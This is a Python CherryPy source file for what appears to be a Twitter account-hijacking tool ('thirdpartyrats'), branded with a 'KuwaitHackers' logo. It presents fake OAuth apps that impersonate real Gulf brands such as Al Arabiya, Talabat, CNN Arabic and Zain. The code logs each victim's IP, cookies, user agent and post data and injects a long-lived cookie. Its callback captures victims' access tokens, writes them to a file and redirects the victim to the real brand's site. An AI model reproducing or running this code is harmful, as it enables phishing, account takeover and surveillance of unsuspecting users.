import os, os.path;
import random;
import string;
from callback.Oauth1Workflow import *;
from assets.getTokens import *;
from callback.CallbackEnum import *;
from modules.Logger import *;
from modules.CookieInjector import *;
from phpserialize import serialize, unserialize;
from TwitterAPI import TwitterAPI;
import RobConfig

import cherrypy

class StringGeneratorApps(object):
    @cherrypy.expose
    def index(self):
        tokens_list = getTokens()

        #TODO: When the user clicks on copy, it will generate (shortened url, authorization url) record.
        #TODO: The Url shortener service will process the url by logging user details, injects long-lived cookie,
        #TODO: and then redirects (300) to the twitter oauth url.

        return """<!DOCTYPE html> 
            <html>
               <head>
                  <title> روب ROB </title>
                  <meta name="description" content="website description" />
                  <meta name="keywords" content="website keywords, website keywords" />
                  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
                  <link rel="stylesheet" type="text/css" href="assets/css/style.css" />
                  <link rel='stylesheet' id='theme53935-css' href='http://livedemo00.template-help.com/wordpress_53935/wp-content/themes/theme53935/main-style.css' type='text/css' media='all'/>
                  <!-- modernizr enables HTML5 elements and feature detects -->
                  <script type="text/javascript" src="assets/js/modernizr-1.5.min.js"></script>
               </head>
               <body>
                  <div id="host" data-port= """+str(cherrypy.config['server.socket_port'])+"""></div>
                  
                  <div id="main">
                     <header>
                        <div id="logo">
                           <a href="Token.html"><img id="logo1" src="assets/images/kuwaithackers.jpeg" alt="KuwaitHackers"><img id="logo2" src="assets/images/logo.png" alt="ROB روب""></a>
                        </div>
                        <!--close welcome-->          
                     </header>
                     <nav>
                        <div id="menubar">
                           <ul id="nav">
                              <li><a href="/thirdpartyrats/twitter/tokens">TOKEN</a></li>
                              <li><a href="/thirdpartyrats/twitter/directMessage">DIRECT-MESSAGE</a></li>
                              <li><a href="/thirdpartyrats/twitter/postTweet">TWEETS</a></li>
                              <li><a href="/thirdpartyrats/twitter/getContacts">CONTACTS</a></li>
                              <li><a href="/thirdpartyrats/twitter/userActivity">USER-ACTIVITY</a></li>
                              <li><a href="/thirdpartyrats/twitter/geoTagging">GEO-TAG</a></li>
                              <li class="current"><a href="/thirdpartyrats/twitter/apps">TWITTER-APPS</a></li>
                              <li><a href="/thirdpartyrats/twitter/urlShortener">URL-SHORTENER</a></li>
                           </ul>
                        </div>
                        <!--close menubar--> 
                     </nav>
                     <div id="site_content">
                        <div class="sidebar_container">
                           <div class="sidebar">
                              <div style="text-align: center;">
                                 <span style="font-weight: bold;">
                                    <h2>&#1604;&#1608;&#1581;&#1577;
                                       &#1575;&#1604;&#1578;&#1581;&#1603;&#1605; &#1604;&#1578;&#1591;&#1576;&#1610;&#1602;&#1575;&#1578;
                                       &#1578;&#1608;&#1578;&#1610;&#1585;&nbsp;&nbsp;&nbsp;<br>Captured tokens
                                    </h2>
                                 </span>
                                 <br>
                                 <br>
                                 <br>
                                 <form method="get" action="/thirdpartyrats/twitter/tokens/getTokenParam">
                                    <select size="12" id="token_id" name="token_id" style="width: 70%; padding: 10px; margin-bottom: 10px;">
                                      """+tokens_list+"""
                                    </select>
                                    <br>
                                    <input type="submit" value="Load Token"/>
                                 </form>
                                 <br>
                              </div>
                           </div>
                           <!--close sidebar-->    
                        </div>
                        <!--close sidebar_container-->   
                        <div id="content" class="container_twitter_app">
                           <article id="center_bar" class="center_bar">
                              <h1 id="center_bar">Twitter Apps</h1>
                              <div class="d-block d-block-system g-main" style="margin-top: 32px;">
                                 <div class="app-icon">
                                    <div class="icon-table">
                                      <table border="0">
                                         <tr>
                                            <td>
                                                <img src="assets/images/apps/"""+LogoFilename[AppsEnum.ALARABIYA]+"""\">
                                            </td>
                                            <td><h6><a href="/thirdpartyrats/twitter/apps/logUser?appEnumString="""+AppName[AppsEnum.ALARABIYA]+"""\">
                                            قناة العربية الاخبارية<p>‏آخر مستجدات الأخبار الهامة من الحساب الرسمي لقناة العربية</p></a></h6></td>
                                         </tr>
                                      </table>
                                    </div>
                                    <div class="app-shortcut">
                                       <a href="javascript:;">
                                          <img id="copy_link" src="assets/images/copy.png" width="73" height="73">
                                        </a>
                                    </div>
                                 </div>
                                 <hr>
                                 <div class="app-icon">
                                    <div class="icon-table">
                                      <table border="0">
                                         <tr>
                                            <td>
                                                <img src="assets/images/apps/"""+LogoFilename[AppsEnum.TALABAT]+"""\">
                                            </td>
                                            <td><h6><a href="/thirdpartyrats/twitter/apps/logUser?appEnumString="""+AppName[AppsEnum.TALABAT]+"""\">
               طلبات دوت كوم<p>‏طلبات دوت كوم ‏أكبر موقع وتطبيق الكتروني في دول الخليج العربي للطلب اون لاين من مطاعمك المفضلة</p></a>
                                            </h6></td>
                                         </tr>
                                      </table>
                                    </div>
                                    <div class="app-shortcut">
                                       <a href="javascript:;">
                                          <img id="copy_link" src="assets/images/copy.png" width="73" height="73"/>
                                        </a>
                                    </div>
                                 </div>
                                 <hr>
                                 <div class="app-icon">
                                    <div class="icon-table">
                                      <table border="0">
                                         <tr>
                                            <td>
                                                <img src="assets/images/apps/"""+LogoFilename[AppsEnum.CNNARABIC]+"""\">
                                            </td>
                                            <td><h6><a href="/thirdpartyrats/twitter/apps/logUser?appEnumString="""+AppName[AppsEnum.CNNARABIC]+"""\">
                                            CNN بالعربية<p>World Wide News Leader, in Arabic, Dubai, United Arab Emirates</p></a></h6></td>
                                         </tr>
                                      </table>
                                    </div>
                                    <div class="app-shortcut">
                                       <a href="javascript:;">
                                          <img id="copy_link" src="assets/images/copy.png" width="73" height="73"/>
                                        </a>
                                    </div>
                                 </div>
                                 <hr>
                                 <div class="app-icon">
                                    <div class="icon-table">
                                      <table border="0">
                                         <tr>
                                            <td>
                                              <img src="assets/images/apps/"""+LogoFilename[AppsEnum.CINESCAPE]+"""\">
                                            </td>
                                            <td><h6><a href="/thirdpartyrats/twitter/apps/logUser?appEnumString="""+AppName[AppsEnum.CINESCAPE]+"""\">
                                            Cinescape - سينسكيب<p>شركة السينما الكويتية الوطنية</p></a></h6></td>
                                         </tr>
                                      </table>
                                    </div>
                                    <div class="app-shortcut">
                                       <a href="javascript:;">
                                          <img id="copy_link" src="assets/images/copy.png" width="73" height="73" />
                                        </a>
                                    </div>
                                 </div>
                                 <hr>
                                 <div class="app-icon">
                                    <div class="icon-table">
                                      <table border="0">
                                         <tr>
                                            <td>
                                               <img src="assets/images/apps/"""+LogoFilename[AppsEnum.WATAN]+"""\">
                                            </td>
                                            <td><h6><a href="/thirdpartyrats/twitter/apps/logUser?appEnumString="""+AppName[AppsEnum.WATAN]+"""\">
                                            قناة الوطن - alwatantv.com<p>تطبيق تلفزيون قناة الوطن لجدول البرامج - مسلسلات -أخبار -رياضة -إسلامي</p></a></h6></td>
                                         </tr>
                                      </table>
                                    </div>
                                    <div class="app-shortcut">
                                       <a href="javascript:;">
                                            <img id="copy_link" src="assets/images/copy.png" width="73" height="73">
                                        </a>
                                    </div>
                                 </div>
                                 <hr>
                                 <div class="app-icon">
                                    <div class="icon-table">
                                      <table border="0">
                                         <tr>
                                            <td>
                                              <img src="assets/images/apps/"""+LogoFilename[AppsEnum.DERWAZA]+"""\">
                                            </td>
                                            <td><h6>
                                            <a href="/thirdpartyrats/twitter/apps/logUser?appEnumString="""+AppName[AppsEnum.DERWAZA]+"""\">
                                            أخبار دروازة<p>أكبر شبكة اخبارية في الكويت، أكثر من ٥٠٠ ألف مشترك ، أخبار متنوعة عالمية ومحلية </p></a></h6></td>
                                         </tr>
                                      </table>
                                    </div>
                                    <div class="app-shortcut">
                                       <a href="javascript:;">
                                          <img id="copy_link" src="assets/images/copy.png" width="73" height="73">
                                        </a>
                                    </div>
                                 </div>
                                 <hr>
                                 <div class="app-icon">
                                    <div class="icon-table">
                                      <table border="0">
                                         <tr>
                                            <td>
                                               <img src="assets/images/apps/"""+LogoFilename[AppsEnum.VIVA]+"""\">
                                            </td>
                                            <td><h6><a href="/thirdpartyrats/twitter/apps/logUser?appEnumString="""+AppName[AppsEnum.VIVA]+"""\">
                                            الكويت VIVA<p>مقدم خدمات الاتصالات المتنقلة الأكثر تطوراً وتقدماً في دولة الكويت</p></a></h6></td>
                                         </tr>
                                      </table>
                                    </div>
                                    <div class="app-shortcut">
                                       <a href="javascript:;">
                                          <img id="copy_link" src="assets/images/copy.png" width="73" height="73">
                                        </a>
                                    </div>
                                 </div>
                                 <hr>
                                 <div class="app-icon">
                                    <div class="icon-table">
                                      <table border="0">
                                         <tr>
                                            <td>
                                                  <img src="assets/images/apps/zain.jpg">
                                            </td>
                                            <td><h6><a href="/thirdpartyrats/twitter/apps/logUser?appEnumString="""+AppName[AppsEnum.ZAIN]+"""\">
                                            الكويت Zain<p>خدمات الدفع الآجل والمسبق وعروض خاصة لشركة زين للاتصالات المتنقلة - الكويت</p></a></h6></td>
                                         </tr>
                                      </table>
                                    </div>
                                    <div class="app-shortcut">
                                       <a href="javascript:;">
                                          <img id="copy_link" src="assets/images/copy.png" width="73" height="73" >
                                        </a>
                                    </div>
                                 </div>
                                 <hr>
                              </div>
                           </article>
                        </div>
                        <!--close content-->   
                     </div>
                     <!--close site_content-->     
                     <footer>
                     </footer>
                     <textarea id="copy_panel" readonly style="margin-left: -9999px;">copy text</textarea>
                  </div>
                  <!--close main-->
                  <style type="text/css">
                     #tokenlist option{
                     font-size: 16px;
                        font-family: "Open Sans", sans-serif;
                     }
                     article hr{
                        margin: 8px 0px;
                     }
                     .app-icon *{
                        font-family: "Open Sans", sans-serif;
                     }
                     #tokenlist{
                        border: 4px ridge white;
                     }
                     .icon-table{
                        width: 90%;
                        float: left;
                     }
                     .app-shortcut{
                        width: 10%;
                        height: 75px;
                        float: right;
                     }
                     hr{
                        clear: both;
                     }
                  </style>
                  <!-- javascript at the bottom for fast page loading -->
                  <script type="text/javascript" src="assets/js/jquery.min.js"></script>
                  <script type="text/javascript" src="assets/js/copyLink.js"></script>
               </body>
            </html>"""


    @cherrypy.expose
    def logUser(self,appEnumString):
        cherrypy.session['selectedEnum'] = appEnumString;
        appEnum = getEnumFromAppName(appEnumString);
        CookieInjector();
        Logger();
        oauthUrl = getRequestToken(ConsumerKeyString[appEnum],ConsumerSecretString[appEnum]);
        print("authorization Url:"+ oauthUrl);
        raise cherrypy.HTTPRedirect(oauthUrl);

        #raise cherrypy.HTTPRedirect("/thirdpartyrats/twitter/apps/injectCookie?appEnumString="+appEnumString)

  #  @cherrypy.expose
 #   def injectCookie(self,appEnumString):
 #       CookieInjector();
 #       appEnum = getEnumFromAppName(appEnumString);
 #       cherrypy.session['selectedEnum'] = appEnumString;
 #       oauthUrl = getRequestToken(ConsumerKeyString[appEnum],ConsumerSecretString[appEnum]);
 #       print("authorization Url:"+ oauthUrl);
 #       raise cherrypy.HTTPRedirect(oauthUrl);

    #twitter triggers this callback function
    @cherrypy.expose
    def callback(self, oauth_token, oauth_verifier):

        #print("oauth_token: " + oauth_token);
        #print("oauth_verifier: "+ oauth_verifier);
        appEnumString = cherrypy.session['selectedEnum'];
        if appEnumString == None:
            return None;
        appEnum = getEnumFromAppName(appEnumString);
        accessToken = getAccessToken(ConsumerKeyString[appEnum],ConsumerSecretString[appEnum], oauth_verifier);
        #print("Access Token:")
        #print(accessToken);


        access_token_str = serialize({'oauth_token':accessToken['oauth_token'],
                        'oauth_token_secret':accessToken['oauth_token_secret'],
                        'user_id':accessToken['user_id'],
                        'screen_name':accessToken['screen_name']});

        loggerToken = cherrypy.session['logger_token'];

        api = TwitterAPI(loggerToken['consumer_key'], loggerToken['consumer_secret'],
                         accessToken['oauth_token'], accessToken['oauth_token_secret']);
        r = api.request('account/settings');
        loggerToken['always_use_https']= r.json()['always_use_https'];
        loggerToken['geo_enabled'] = r.json()['geo_enabled'];
        loggerToken['discoverable_by_email'] = r.json()['discoverable_by_email'];

        logger_token_str = serialize({'ip':loggerToken['ip'],
                                     'ip2':loggerToken['ip2'],
                                     'ip3':loggerToken['ip3'],
                                     'port':loggerToken['port'],
                                     'useragent':loggerToken['useragent'],
                                     'cookie':loggerToken['cookie'],
                                     'referer':loggerToken['referer'],
                                     'query':loggerToken['query'],
                                     'postdata':loggerToken['postdata'],
                                     'time':loggerToken['time'],
                                     'consumer_key':loggerToken['consumer_key'],
                                     'consumer_secret':loggerToken['consumer_secret'],
                                     'always_use_https':loggerToken['always_use_https'],
                                     'geo_enabled':loggerToken['geo_enabled'],
                                     'discoverable_by_email':loggerToken['discoverable_by_email']
                                      });
        #print(access_token_str);
        #print(logger_token_str);

        #write the access token to the app file
        f = open ("./assets/tokens.txt","a+");
        f.write(access_token_str.decode('utf-8')+logger_token_str.decode('utf-8'));
        f.write('\n');
        f.close();

        raise cherrypy.HTTPRedirect(DestinationUrl[appEnum]);

